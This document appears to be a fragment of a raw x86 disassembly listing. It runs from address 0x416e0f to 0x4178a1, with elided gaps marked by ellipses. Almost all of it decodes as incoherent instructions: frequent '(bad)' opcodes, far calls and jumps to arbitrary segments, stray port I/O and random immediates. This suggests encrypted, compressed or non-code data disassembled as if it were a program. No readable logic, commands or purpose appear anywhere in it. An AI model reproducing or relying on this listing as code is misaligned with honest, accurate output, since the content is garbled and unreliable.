  416e0f:	stos   DWORD PTR es:[edi],eax
  416e10:	ret    0xc1b6
  416e13:	repz lea edx,[eax*8-0x374e5887]
  416e1b:	jl     0x416db4
  416e1d:	je     0x416dab
  416e1f:	pop    es
  416e20:	rcl    eax,1
  416e22:	lea    ecx,[edi-0x1e]
  416e25:	sahf   
  416e26:	or     eax,DWORD PTR [ebx+0x19f01f0]
  416e2c:	mov    al,0x82
  416e2e:	test   al,ch
  416e30:	pop    es
  416e31:	sub    eax,0x583d4b71
  416e36:	push   es
  416e37:	ror    BYTE PTR [edi-0x5a7b3ff3],1
  416e3d:	pusha  
  416e3e:	xor    DWORD PTR [eax+0x1e4d764a],ebp
  416e44:	rcl    BYTE PTR [edx],0x4f
  416e47:	enter  0x6aa8,0x1
  416e4b:	and    al,0x7e
  416e4d:	push   ebx
  416e4e:	ficom  DWORD PTR [edi-0x7f6e1d67]
  416e54:	pop    ebp
  416e55:	enter  0x4af4,0x5a
  416e59:	aas    
  416e5a:	push   edi
  416e5b:	sub    al,0xaa
  416e5d:	mov    esp,0xd5bff668
  416e62:	into   
  416e63:	cmp    DWORD PTR [ecx-0x36],esi
  416e66:	mov    ds:0x7a80757a,al
  416e6b:	fimul  WORD PTR ds:0xd8c4065f
  416e71:	mov    ah,0x93
  416e73:	lea    edx,[eax]
  416e75:	add    DWORD PTR [edx],0x52f9814a
  416e7b:	or     ebp,DWORD PTR fs:[ecx-0x35]
  416e7f:	imul   edx,ebp,0x34
  416e82:	adc    BYTE PTR [ebp-0x76],ah
  416e85:	lods   eax,DWORD PTR ds:[esi]
  416e86:	mov    WORD PTR [eax+0x2d],es
  416e89:	js     0x416e6b
  416e8b:	nop
  416e8c:	adc    BYTE PTR ds:0xbb3b,dh
	...
  416ef2:	add    BYTE PTR [eax],al
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x22d08eea
  416f02:	mov    ss,WORD PTR [ebp+0xf25c]
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	inc    esp
  416f0d:	rcr    DWORD PTR [edi],cl
  416f0f:	pop    esi
  416f10:	cmp    eax,0xf78d1b98
  416f15:	add    bh,dh
  416f17:	(bad)  
  416f18:	mov    ecx,0x9c4c3460
  416f1d:	sbb    al,0xad
  416f1f:	pusha  
  416f20:	mov    cs,WORD PTR [esi+0x6cf1b60]
  416f26:	mov    ebx,0x20ad17e
  416f2b:	fild   QWORD PTR [esi-0xcd5bb6e]
  416f31:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  416f33:	mov    dl,BYTE PTR [ebx+0x36]
  416f36:	jle    0x416f86
  416f38:	aaa    
  416f39:	ss adc eax,0x847729eb
  416f3f:	inc    esp
  416f40:	cwde   
  416f41:	retf   
  416f42:	or     al,0x9
  416f44:	loope  0x416f7c
  416f46:	pop    ebx
  416f47:	push   cs
  416f48:	pop    bx
  416f4a:	pushf  
  416f4b:	test   BYTE PTR ds:0xaaafa7b9,cl
  416f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f52:	mov    esp,esp
  416f54:	dec    esp
  416f55:	je     0x416f9d
  416f57:	push   ecx
  416f58:	(bad)  
  416f59:	retf   0x970b
  416f5c:	outs   dx,BYTE PTR ds:[esi]
  416f5d:	mov    al,ds:0xedc8208b
  416f62:	push   esi
  416f63:	mov    al,0x5e
  416f65:	jge    0x416fb6
  416f67:	retf   0x6865
  416f6a:	jg     0x416f48
  416f6c:	data16 jg 0x416f5b
  416f6f:	cmp    DWORD PTR [edx-0x290ba124],0x3d3f80ea
  416f79:	jg     0x416f0d
  416f7b:	cld    
  416f7c:	push   edx
  416f7d:	mov    ebx,0xdfdb62c7
  416f82:	(bad)  
  416f83:	fistp  WORD PTR [edx+0x3c]
  416f86:	rcl    ebp,1
  416f88:	lods   al,BYTE PTR ds:[esi]
  416f89:	shl    BYTE PTR [esi+0x505e3da0],0x34
  416f90:	or     al,0x8
  416f92:	cmp    al,0x7a
  416f94:	mov    ds:0x6b5fd2f5,eax
  416f99:	dec    esi
  416f9a:	sub    eax,0x180a243e
  416f9f:	mov    edi,0xd24788cf
  416fa4:	and    eax,0xed02f233
  416fa9:	mov    ch,BYTE PTR ds:[esi]
  416fac:	(bad)  
  416fad:	clc    
  416fae:	mov    ds:0xd589a07e,al
  416fb3:	out    0x96,al
  416fb5:	mov    eax,ds:0x393ddd83
  416fba:	mov    bh,0x85
  416fbc:	dec    edx
  416fbd:	xchg   edx,esi
  416fbf:	or     cl,BYTE PTR [edx]
  416fc1:	or     al,0x32
  416fc3:	or     DWORD PTR [ebx+0x4b40b1cc],edi
  416fc9:	sahf   
  416fca:	mov    edx,0xc83137ee
  416fcf:	pop    es
  416fd0:	xor    esp,DWORD PTR [esi]
  416fd2:	cmp    bl,al
  416fd4:	fsub   DWORD PTR [eax-0x1548a653]
  416fda:	mov    ch,0xe3
  416fdc:	or     eax,0xd86a7642
  416fe1:	cmp    DWORD PTR [edx],ecx
  416fe3:	lock pop ds
  416fe5:	and    DWORD PTR [edi-0x172c0437],esi
  416feb:	sub    ebx,ebp
  416fed:	push   cs
  416fee:	lahf   
  416fef:	add    al,0xa1
  416ff1:	daa    
  416ff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ff3:	mov    eax,ds:0x96592399
  416ff8:	repz add ch,ah
  416ffb:	jge    0x41704d
  416ffd:	or     edx,DWORD PTR [ebx-0x63b8bd10]
  417003:	ffreep st(5)
  417005:	nop
  417006:	aam    0x9a
  417008:	add    al,0x22
  41700a:	pop    esi
  41700b:	(bad)  
  41700c:	xor    al,0x52
  41700e:	mov    al,0xa8
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ebx,DWORD PTR [edx-0x39]
  417082:	inc    edi
  417083:	lea    esp,[eax-0xd]
  417086:	add    BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	out    0xa3,eax
  41708e:	jl     0x41709f
  417090:	add    al,0xb7
  417092:	xchg   bl,bh
  417094:	push   ecx
  417095:	sub    al,0xb7
  417097:	shl    BYTE PTR [ecx+eax*1+0xc],1
  41709b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41709c:	mov    gs,WORD PTR [eax-0x3b]
  41709f:	outs   dx,DWORD PTR ds:[esi]
  4170a0:	xchg   esp,eax
  4170a1:	dec    ebx
  4170a2:	clc    
  4170a3:	jg     0x41706b
  4170a5:	push   edx
  4170a6:	inc    eax
  4170a7:	retf   0xde3
  4170aa:	xchg   esp,ebp
  4170ac:	inc    esi
  4170ad:	dec    ebp
  4170ae:	pushf  
  4170af:	int3   
  4170b0:	in     eax,dx
  4170b1:	push   eax
  4170b2:	add    ebx,DWORD PTR [edx+0x14035e91]
  4170b8:	jge    0x4170eb
  4170ba:	rcr    DWORD PTR [esi-0x33],0xe9
  4170be:	(bad)  
  4170bf:	lahf   
  4170c0:	or     edx,DWORD PTR [ecx-0x506e1dfc]
  4170c6:	bound  esi,QWORD PTR [edi]
  4170c8:	ficom  DWORD PTR [ecx]
  4170ca:	sub    edx,DWORD PTR [ebp-0x63]
  4170cd:	push   ss
  4170ce:	mov    dl,0x80
  4170d0:	not    BYTE PTR [edi]
  4170d2:	pop    eax
  4170d3:	enter  0x678b,0xce
  4170d7:	pushf  
  4170d8:	dec    edi
  4170d9:	push   0x0
  4170db:	push   edi
  4170dc:	sub    BYTE PTR [esi-0x2b],0x2c
  4170e0:	sbb    eax,0xadf68f01
  4170e5:	fdivr  QWORD PTR [ebp+0x40d504ae]
  4170eb:	int    0x21
  4170ed:	pop    ebx
  4170ee:	shr    DWORD PTR [ecx+ebx*1],cl
  4170f1:	push   edx
  4170f2:	mov    al,0xb1
  4170f4:	out    dx,al
  4170f5:	cli    
  4170f6:	fstp   DWORD PTR [eax+0x6b]
  4170f9:	xor    BYTE PTR [ebx],0xe6
  4170fc:	loope  0x4170fe
  4170fe:	or     DWORD PTR [edi-0x27],edx
  417101:	fbstp  TBYTE PTR [ecx]
  417103:	in     al,dx
  417104:	ret    0xc5fc
  417107:	mov    edi,0x7274ef1d
  41710c:	bound  eax,QWORD PTR [esi-0x13327055]
  417112:	or     bh,BYTE PTR [edi]
  417114:	and    eax,0x47659c0d
  417119:	fild   DWORD PTR [esi+0x74]
  41711c:	mov    ah,0x88
  41711e:	inc    esi
  41711f:	ror    BYTE PTR [esi-0x185d18ae],1
  417125:	jge    0x417176
  417127:	shl    DWORD PTR [esi+0x3e],0xf5
  41712b:	sub    BYTE PTR [ebx-0x25891a73],al
  417131:	sbb    cl,cl
  417133:	add    DWORD PTR [ebp-0x10],ebx
  417136:	je     0x41713a
  417138:	sbb    BYTE PTR [edi],bl
  41713a:	popf   
  41713b:	inc    edi
  41713c:	es xchg ebp,eax
  41713e:	icebp  
  41713f:	mov    al,0x1d
  417141:	adc    esp,DWORD PTR [esi+0x24]
  417144:	retf   
  417145:	int3   
  417146:	add    al,0x37
  417148:	sub    cl,BYTE PTR ds:0x6d4b4b71
  41714e:	jns    0x417176
  417150:	dec    ecx
  417151:	xchg   esi,eax
  417152:	xlat   BYTE PTR ds:[ebx]
  417153:	lock test BYTE PTR ds:0xff8c4677,dl
  41715a:	not    BYTE PTR [ebp+0x4a37fd1]
  417160:	jmp    0xf76d:0x16d03228
  417167:	mov    al,ds:0x58957189
  41716c:	add    DWORD PTR [ecx],esi
  41716e:	xchg   BYTE PTR [edi],cl
  417170:	ds ret 
  417172:	and    BYTE PTR [ebx+0x7],bh
  417175:	jo     0x41712a
  417177:	and    al,0x9
  417179:	out    0x68,eax
  41717b:	in     al,0x2f
  41717d:	mov    bl,BYTE PTR [eax-0x24]
  417180:	mov    BYTE PTR [edx],dh
  417182:	shl    DWORD PTR [esi],0xb2
  417185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417186:	outs   dx,DWORD PTR ds:[esi]
  417187:	icebp  
  417188:	mov    edx,0x2e86a4f3
  41718d:	dec    eax
  41718e:	test   ebx,esi
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	shl    BYTE PTR [esi+eax*2],0x29
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	xor    dl,dl
  41720e:	pop    ebp
  41720f:	bound  esp,QWORD PTR [edi-0x1ea82315]
  417215:	(bad)  
  417216:	and    al,0x55
  417218:	xor    esp,DWORD PTR [ebx+eax*8]
  41721b:	ret    0x8257
  41721e:	nop
  41721f:	sbb    BYTE PTR ds:0xbf6e67c3,bl
  417225:	rcr    BYTE PTR [ecx-0x7f42966a],1
  41722b:	je     0x417226
  41722d:	(bad)  
  41722e:	and    ecx,edx
  417230:	leave  
  417231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417232:	mov    bh,0x51
  417234:	aaa    
  417235:	arpl   WORD PTR fs:[ebp+0x3fda7e8f],di
  41723c:	inc    edi
  41723d:	mov    cl,0xa2
  41723f:	push   DWORD PTR [ecx+0x74]
  417242:	stos   DWORD PTR es:[edi],eax
  417243:	jnp    0x4171d8
  417245:	fld    DWORD PTR [edi+0x50fd898c]
  41724b:	outs   dx,DWORD PTR ds:[esi]
  41724c:	scas   eax,DWORD PTR es:[edi]
  41724d:	loope  0x417248
  41724f:	ret    
  417250:	pop    ds
  417251:	jmp    0x969ac4c7
  417256:	push   eax
  417257:	and    DWORD PTR [eax+0x2a1aa4e],eax
  41725d:	pop    ss
  41725e:	gs pop es
  417260:	cwde   
  417261:	pop    eax
  417262:	pop    edx
  417263:	add    eax,0xc9b2622
  417268:	js     0x417254
  41726a:	cmp    DWORD PTR [edx-0xc],ecx
  41726d:	mov    DWORD PTR [esi],eax
  41726f:	lods   eax,DWORD PTR ds:[esi]
  417270:	mov    es,WORD PTR [ebx+0x6047fdc7]
  417276:	or     bh,BYTE PTR [ebp+0x71]
  417279:	inc    ecx
  41727a:	jnp    0x4172fa
  41727c:	mov    eax,DWORD PTR [ecx-0x5c]
  41727f:	dec    ebx
  417280:	out    0xa0,eax
  417282:	xchg   esi,eax
  417283:	ficom  DWORD PTR [eax+esi*1-0x41]
  417287:	mov    ds:0xb4e4ba34,eax
  41728c:	cmp    DWORD PTR [esp+ecx*2-0x79f6bc31],eax
  417293:	ins    BYTE PTR es:[edi],dx
  417294:	push   ebx
  417295:	push   0x9a266fd4
  41729a:	repz push cs
  41729c:	cdq    
  41729d:	sbb    eax,0x4c92f831
  4172a2:	hlt    
  4172a3:	push   esp
  4172a4:	inc    ebx
  4172a5:	mov    ebx,0x500e83c1
  4172aa:	adc    eax,0x22dfb5ed
  4172af:	(bad)  [esi+0x22668269]
  4172b5:	int    0xe0
  4172b7:	retf   0x5323
  4172ba:	pop    es
  4172bb:	jp     0x41729e
  4172bd:	dec    edx
  4172be:	push   0xcc0e3e33
  4172c3:	imul   edi,DWORD PTR [eax],0x197fdd68
  4172c9:	(bad)  
  4172ca:	sub    eax,0x382f7f0b
  4172cf:	fisttp WORD PTR [edx+0x40]
  4172d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172d3:	fcmove st,st(6)
  4172d5:	add    eax,0xbd8f803a
  4172da:	inc    edx
  4172db:	or     eax,0x7a0bef8
  4172e0:	mov    dh,0x28
  4172e2:	call   0x1427:0x42a0b917
  4172e9:	loopne 0x417277
  4172eb:	inc    edx
  4172ec:	pop    ecx
  4172ed:	divps  xmm4,XMMWORD PTR ds:0xd6f53f5e
  4172f4:	xor    esi,DWORD PTR [edx]
  4172f6:	data16 out dx,al
  4172f8:	inc    esi
  4172f9:	pop    esi
  4172fa:	test   DWORD PTR [esi-0xd79f081],edi
  417300:	imul   ebp,DWORD PTR [ecx],0xffffffd9
  417303:	ror    BYTE PTR [edi+edx*2+0x2cbb0309],cl
  41730a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41730b:	sbb    ebx,ebp
  41730d:	mov    cl,0x89
  41730f:	xchg   ecx,eax
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs inc eax
  417381:	stc    
  417382:	xchg   esp,eax
  417383:	cmp    DWORD PTR [eax-0xb],ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    al,0x1
  41738a:	add    BYTE PTR [eax],al
  41738c:	sbb    al,0x15
  41738e:	and    eax,0x6c9bba63
  417393:	lea    edi,[ecx]
  417395:	jp     0x41731a
  417397:	pop    eax
  417398:	cld    
  417399:	pop    esi
  41739a:	xchg   ebx,eax
  41739b:	or     al,0x19
  41739d:	lods   eax,DWORD PTR ds:[esi]
  41739e:	lahf   
  41739f:	jl     0x417335
  4173a1:	retf   
  4173a2:	add    al,0x2a
  4173a4:	inc    ebp
  4173a5:	fwait
  4173a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173a7:	js     0x41732a
  4173a9:	xchg   BYTE PTR [edi],dh
  4173ab:	fild   QWORD PTR [ebx]
  4173ad:	cmp    al,0x2e
  4173af:	jae    0x4173f6
  4173b1:	mov    eax,0x76f4bcc6
  4173b6:	xchg   DWORD PTR [edi],ecx
  4173b8:	sar    BYTE PTR ds:0x4ae82181,cl
  4173be:	or     eax,0x90a978a3
  4173c3:	daa    
  4173c4:	iret   
  4173c5:	int    0xe3
  4173c7:	cs sub eax,0xb6173650
  4173cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ce:	mov    BYTE PTR [ebx+0x4baaf88c],ah
  4173d4:	call   0xb7bb7020
  4173d9:	mov    ah,0xfb
  4173db:	pop    eax
  4173dc:	add    dl,BYTE PTR [eax]
  4173de:	and    DWORD PTR [ebp-0x207329c3],ebp
  4173e4:	ja     0x4173b4
  4173e6:	lods   al,BYTE PTR ds:[esi]
  4173e7:	mov    eax,DWORD PTR [edi-0x79]
  4173ea:	sub    BYTE PTR [edi-0x17947c3f],dl
  4173f0:	lea    eax,[eax]
  4173f2:	popf   
  4173f3:	and    ch,BYTE PTR [ebx+0x31]
  4173f6:	pop    ds
  4173f7:	lock adc cl,dl
  4173fa:	lea    ebp,[eax+0x10bb72e9]
  417400:	fdivr  st(1),st
  417402:	xchg   esp,eax
  417403:	stos   BYTE PTR es:[edi],al
  417404:	mov    cl,0xf4
  417406:	ss jmp 0x5da33c1
  41740c:	mov    ch,0x88
  41740e:	retf   0xd815
  417411:	sub    bh,bh
  417413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417414:	fisub  WORD PTR [esi]
  417416:	popf   
  417417:	and    eax,0xad584f5d
  41741c:	arpl   WORD PTR [ecx],di
  41741e:	and    eax,0x41ad42f8
  417423:	mov    eax,ds:0xd06ed67c
  417428:	xchg   edx,eax
  417429:	mov    eax,esi
  41742b:	jecxz  0x417412
  41742d:	pop    ecx
  41742e:	sub    ebp,DWORD PTR [esi+0x18]
  417431:	cli    
  417432:	scas   eax,DWORD PTR es:[edi]
  417433:	jnp    0x417449
  417435:	xchg   bl,dh
  417437:	pop    ss
  417438:	sub    eax,0x344f5258
  41743d:	(bad)  
  41743e:	xchg   ecx,eax
  41743f:	pop    esp
  417440:	imul   ebp,eax,0x5a53f69c
  417446:	retw   
  417448:	push   cs
  417449:	inc    edi
  41744a:	mov    ah,bh
  41744c:	les    edi,FWORD PTR [eax+ebp*8+0x17ba168a]
  417453:	ins    BYTE PTR es:[edi],dx
  417454:	pop    eax
  417455:	inc    ebx
  417456:	xchg   ebp,eax
  417457:	aad    0xc
  417459:	inc    esp
  41745a:	xchg   edx,eax
  41745b:	cwde   
  41745c:	pop    esp
  41745d:	push   cs
  41745e:	rcr    DWORD PTR [edx+0x16],0x10
  417462:	imul   ebx,DWORD PTR ds:0x581dc40d,0xffffffd1
  417469:	sbb    al,0x4b
  41746b:	xchg   ebx,eax
  41746c:	or     esp,esi
  41746e:	(bad)  
  41746f:	push   esp
  417470:	xchg   edx,eax
  417471:	sar    BYTE PTR [ecx-0x4a],0xd9
  417475:	mov    ds:0xc34c7218,eax
  41747a:	xor    DWORD PTR [ecx-0x68],edi
  41747d:	dec    ebp
  41747e:	pop    ecx
  41747f:	mov    ah,0x5c
  417481:	add    DWORD PTR [ebx-0x4a4edcf3],ebx
  417487:	lds    edi,FWORD PTR [ecx-0x20]
  41748a:	or     ecx,DWORD PTR [eax-0x2dd732fd]
	...
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	push   cs
  417501:	sbb    ch,BYTE PTR [edi+0xf66c81]
  417507:	add    BYTE PTR [ecx+eax*1],al
  41750a:	add    BYTE PTR [eax],al
  41750c:	jmp    0x4ee9592f
  417511:	rcr    edi,0xb2
  417514:	ds xchg edi,esi
  417517:	sub    al,0xe8
  417519:	push   es
  41751a:	jecxz  0x417559
  41751c:	sahf   
  41751d:	enter  0x84c4,0xb4
  417521:	mov    eax,0x7009188f
  417526:	pop    ecx
  417527:	jle    0x4174fa
  417529:	jmp    0x3a28ace0
  41752e:	cmp    al,0xa3
  417530:	sbb    al,0x60
  417532:	outs   dx,DWORD PTR ds:[esi]
  417533:	or     al,0x8f
  417535:	and    ah,BYTE PTR [esi-0x9]
  417538:	push   ss
  417539:	push   0xffffffd5
  41753b:	dec    eax
  41753c:	xchg   ebx,eax
  41753d:	mov    eax,ds:0x527dae0d
  417542:	adc    al,0xbc
  417544:	loopne 0x4174d0
  417546:	lods   eax,DWORD PTR ds:[esi]
  417547:	ss pop ebp
  417549:	mov    ds,WORD PTR [ebp-0x5ed1565e]
  41754f:	mov    edi,DWORD PTR [ebx+0xe67634e]
  417555:	out    dx,eax
  417556:	inc    edx
  417557:	sbb    dl,BYTE PTR [esi]
  417559:	dec    ebp
  41755a:	adc    BYTE PTR [esi],dl
  41755c:	sti    
  41755d:	pusha  
  41755e:	sub    DWORD PTR [ebx-0x48],ebp
  417561:	inc    ebp
  417562:	icebp  
  417563:	jg     0x417588
  417565:	enter  0x117d,0xe8
  417569:	and    ebx,ecx
  41756b:	cmp    eax,0x40d70c04
  417570:	dec    esi
  417571:	xchg   ebx,eax
  417572:	mov    al,ds:0xbc160dc1
  417577:	jb     0x41754a
  417579:	rol    BYTE PTR [ebx-0xc],0xb5
  41757d:	sub    BYTE PTR [ecx],bl
  41757f:	lahf   
  417580:	push   0xffffffc1
  417582:	cmp    al,0x8e
  417584:	xor    al,BYTE PTR [eax-0x75]
  417587:	add    bl,bl
  417589:	dec    eax
  41758a:	pop    ebp
  41758b:	rcl    BYTE PTR [esi-0x2bca551f],0x7d
  417592:	dec    edi
  417593:	fcmovbe st,st(4)
  417595:	push   es
  417596:	fidiv  WORD PTR [ecx]
  417598:	jecxz  0x41759e
  41759a:	cmp    eax,0xd483121a
  41759f:	adc    dl,BYTE PTR [eax+0x7e170a61]
  4175a5:	mov    esp,0x2c448896
  4175aa:	js     0x4175fc
  4175ac:	push   ss
  4175ad:	(bad)  
  4175af:	adc    eax,0x8652c787
  4175b4:	xchg   BYTE PTR [edi-0x58],cl
  4175b7:	add    al,0x42
  4175b9:	xchg   esp,eax
  4175ba:	pop    ss
  4175bb:	in     al,dx
  4175bc:	test   al,0xaa
  4175be:	aad    0x23
  4175c0:	out    0x2,eax
  4175c2:	adc    cl,0x36
  4175c5:	mov    esp,0xa5383e9c
  4175ca:	inc    ebp
  4175cb:	arpl   si,sp
  4175cd:	lods   eax,DWORD PTR ds:[esi]
  4175ce:	cld    
  4175cf:	stos   BYTE PTR es:[edi],al
  4175d0:	dec    eax
  4175d1:	jnp    0x4175fb
  4175d3:	stos   DWORD PTR es:[edi],eax
  4175d4:	mov    dh,BYTE PTR [ebx+0x47]
  4175d7:	pop    ss
  4175d8:	repz jae 0x41764c
  4175db:	lods   eax,DWORD PTR ds:[esi]
  4175dc:	dec    edi
  4175dd:	mov    ebp,gs
  4175df:	repnz mov edx,fs
  4175e2:	mov    ecx,0x310cdbdf
  4175e7:	push   ds
  4175e8:	dec    ebx
  4175e9:	sti    
  4175ea:	in     al,0x17
  4175ec:	call   0x955e:0xcf4537a7
  4175f3:	mov    ecx,0x131d9746
  4175f8:	scas   al,BYTE PTR es:[edi]
  4175f9:	push   esi
  4175fa:	lahf   
  4175fb:	pop    edi
  4175fc:	(bad)  
  4175fd:	and    ebp,esp
  4175ff:	(bad)  
  417600:	sub    DWORD PTR [ebx-0x7804770c],eax
  417606:	aad    0x93
  417608:	xchg   ecx,eax
  417609:	sbb    DWORD PTR [esi],edx
  41760b:	call   0x0:0x67cfc6ee
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fcmovu st,st(1)
  417681:	test   al,0xf
  417683:	shl    DWORD PTR [eax-0x9],0x0
  417687:	add    BYTE PTR [ecx+eax*1],al
  41768a:	add    BYTE PTR [eax],al
  41768c:	and    DWORD PTR [edi-0x57],esi
  41768f:	adc    DWORD PTR [edx],0xb4be4f30
  417695:	cmp    eax,0x210ae820
  41769a:	push   ebx
  41769b:	pop    eax
  41769c:	dec    ecx
  41769d:	dec    esp
  41769e:	mov    edx,0x5cee3fe8
  4176a3:	js     0x417723
  4176a5:	jle    0x417693
  4176a7:	push   cs
  4176a8:	jnp    0x417684
  4176aa:	rcl    bh,cl
  4176ac:	and    ebp,DWORD PTR [ebp+esi*1-0x5d]
  4176b0:	and    cl,bh
  4176b2:	add    dl,BYTE PTR [ebp+0x6a]
  4176b5:	add    bl,0x69
  4176b8:	xchg   ebx,eax
  4176b9:	or     esp,DWORD PTR [ebp+0x20fa6972]
  4176bf:	cmp    BYTE PTR [edx+0x1322b334],0xf3
  4176c6:	add    eax,0xeddbe443
  4176cb:	stos   BYTE PTR es:[edi],al
  4176cc:	nop
  4176cd:	pop    edx
  4176ce:	mov    ecx,0xb3fb4076
  4176d3:	adc    BYTE PTR [ecx],0x96
  4176d6:	(bad)  
  4176d7:	shl    bh,cl
  4176d9:	mov    eax,0x873c7e5e
  4176de:	adc    DWORD PTR [edi+0x39],edx
  4176e1:	inc    ebx
  4176e2:	loop   0x4176bd
  4176e4:	test   esi,edi
  4176e6:	fwait
  4176e7:	jb     0x4176e3
  4176e9:	dec    ebp
  4176ea:	mov    ds:0xfa474887,eax
  4176ef:	jb     0x4176fc
  4176f1:	scas   al,BYTE PTR es:[edi]
  4176f2:	cmp    eax,0x6c325645
  4176f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176f8:	sub    DWORD PTR [ebx+eax*4+0x24],ecx
  4176fc:	lea    ebp,[ecx-0x581dce4d]
  417702:	mov    al,0xfe
  417704:	add    BYTE PTR [edi],ch
  417706:	inc    ecx
  417707:	mov    dl,0x61
  417709:	loop   0x4176ce
  41770b:	adc    DWORD PTR [ecx-0x5f],0xfffffff4
  41770f:	ins    BYTE PTR es:[edi],dx
  417710:	cmp    bl,bh
  417712:	mov    al,ds:0xd644f365
  417717:	test   DWORD PTR ds:0xb2109366,ebp
  41771d:	xchg   edi,eax
  41771e:	ret    
  41771f:	xchg   edi,eax
  417720:	in     eax,0x7b
  417722:	loop   0x41770d
  417724:	out    dx,eax
  417725:	sbb    bl,cl
  417727:	push   ss
  417728:	mov    ebx,0x90535eff
  41772d:	and    al,0x2c
  41772f:	ror    DWORD PTR [edx],1
  417731:	cld    
  417732:	outs   dx,BYTE PTR ds:[esi]
  417733:	cs pop ebx
  417735:	loopne 0x417722
  417737:	jo     0x417767
  417739:	(bad)  
  41773a:	in     al,dx
  41773b:	in     eax,dx
  41773c:	cmp    ah,BYTE PTR [ebx+eiz*4]
  41773f:	addr16 push 0x4b
  417742:	cli    
  417743:	(bad)  
  417744:	fwait
  417745:	xor    ebx,esi
  417747:	sub    al,0xa0
  417749:	adc    eax,0xe7d11936
  41774e:	jae    0x417761
  417750:	push   edx
  417751:	mov    ecx,0xa9e7f752
  417756:	xchg   esi,eax
  417757:	inc    ecx
  417758:	lea    eax,ds:0xeb093c08
  41775e:	cmp    BYTE PTR [ebx-0x5c32487b],bh
  417764:	mov    cl,0x79
  417766:	lea    ebp,[ecx-0x7addb3e3]
  41776c:	sub    dl,BYTE PTR [ebx]
  41776e:	mov    esp,0x5089fc10
  417773:	fiadd  DWORD PTR [ecx]
  417775:	(bad)  
  417776:	and    eax,0x643fe487
  41777b:	adc    DWORD PTR [edi-0x5bd8a057],edx
  417781:	mov    cl,0x3a
  417783:	outs   dx,DWORD PTR ds:[esi]
  417784:	aaa    
  417785:	ds call 0x4f07e32b
  41778b:	dec    eax
  41778c:	leave  
  41778d:	outs   dx,BYTE PTR ds:[esi]
  41778e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41778f:	int3   
	...
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	jge    0x417824
  417802:	push   0xffffffed
  417804:	je     0x4177fe
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	outs   dx,DWORD PTR ds:[esi]
  41780d:	mov    al,0x52
  41780f:	cli    
  417810:	dec    esp
  417811:	and    al,0x4
  417813:	loop   0x417845
  417815:	sti    
  417816:	cmp    DWORD PTR fs:[edi],ebp
  417819:	mov    DWORD PTR [esi+0x30cf0611],ebp
  41781f:	xor    al,0x23
  417821:	mov    ds:0x91bd46cd,eax
  417826:	clc    
  417827:	mov    esp,0xfb6afb0d
  41782c:	adc    bl,ah
  41782e:	leave  
  41782f:	shl    DWORD PTR [edx-0x60979c44],cl
  417835:	ret    0x723e
  417838:	repnz retf 
  41783a:	lds    esi,FWORD PTR [ebx-0x21845a4a]
  417840:	or     BYTE PTR [eax-0x1f1f0229],bl
  417846:	mov    ebx,DWORD PTR [ecx]
  417848:	mov    ecx,0x69d1a66e
  41784d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41784e:	jp     0x417817
  417850:	scas   eax,DWORD PTR es:[edi]
  417851:	fcomp  DWORD PTR [edx-0x42]
  417854:	mov    al,ds:0x5d4035ab
  417859:	repz inc ebx
  41785b:	test   DWORD PTR [edx-0x33be0e21],edi
  417861:	jge    0x41781d
  417863:	and    eax,0x875e1dea
  417868:	pop    ss
  417869:	adc    bl,BYTE PTR ds:0x72ca63f0
  41786f:	mov    bl,BYTE PTR [edx+edx*4+0x27]
  417873:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417875:	adc    ebp,DWORD PTR [edx+0x50]
  417878:	sub    al,bh
  41787a:	aas    
  41787b:	std    
  41787c:	(bad)  
  41787d:	clc    
  41787e:	pop    ecx
  41787f:	sbb    DWORD PTR [edi],ebp
  417881:	pop    edx
  417882:	push   0x78
  417884:	les    ebp,FWORD PTR [edi+0x38]
  417887:	ss mov esi,ecx
  41788a:	jge    0x41789e
  41788c:	push   es
  41788d:	mov    edi,0x2b4e0a3a
  417892:	mov    bl,0x97
  417894:	pop    ebx
  417895:	or     ebp,DWORD PTR [ecx]
  417897:	mov    ebx,0x3e26e2f1
  41789c:	call   0xa5ebd4e3
  4178a1:	ins    BYTE PTR es:[edi],dx
